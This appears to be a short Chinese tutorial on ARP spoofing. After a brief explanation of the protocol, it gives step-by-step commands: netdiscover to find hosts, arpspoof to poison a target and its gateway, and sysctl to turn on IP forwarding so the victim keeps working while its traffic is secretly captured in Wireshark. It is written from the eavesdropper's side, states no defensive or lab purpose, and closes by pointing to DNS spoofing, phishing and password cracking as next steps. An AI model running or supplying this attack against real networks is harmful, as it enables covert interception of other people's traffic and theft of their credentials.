0. 简介

ARP协议

地址解析协议，Address Resolution Protocol

作用：根据IP地址获取物理地址的一个TCP/IP协议。

概述：主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。

1. 探测

【命令】

netdiscover

【命令】

target=192.168.0.101 # 填目标机的地址

host=192.168.0.1 # 填网关地址


2. 毒化

【命令】

arpspoof -i wlan0 -t $target $host

由于 Linux 内核默认关闭 IP 转发，所以这时候毒化会截断所有包，导致目标无法上网，也就是传说中的断！网！攻！击!（又叫我团战拔你网线，滑稽）


3. 开启 IP 转发

当然作为一个合格的窃听者，就不能断网啦，甚至不能让目标机器意识到你的存在，所以就需要开启 IP 转发功能。

查询是否开启

【命令】

sysctl -a | grep ip_forward

看到那个 0 了没，是不是和大一课上学 C 时 FALSE 的值一样？就代表没开转发

手动开启

【命令】

sysctl -w net.ipv4.ip_forward=1 

    装好之后就可一用 arpspoof 继续窃听啦，打开 wireshark 可以清楚的看到受害机的流量。

    毒化成功之后的后续操作就非常多啦，毕竟受害机的流量完全从你的电脑中走啦，搓它是圆的就是圆的，捏它是扁的就是扁的，比如：dns欺骗啦，钓鱼啦，窥它网页啦，爆它密码啦等等等。由于时间问题还有法律问题就不展开啦，感兴趣的可以问问神奇的搜索引擎。
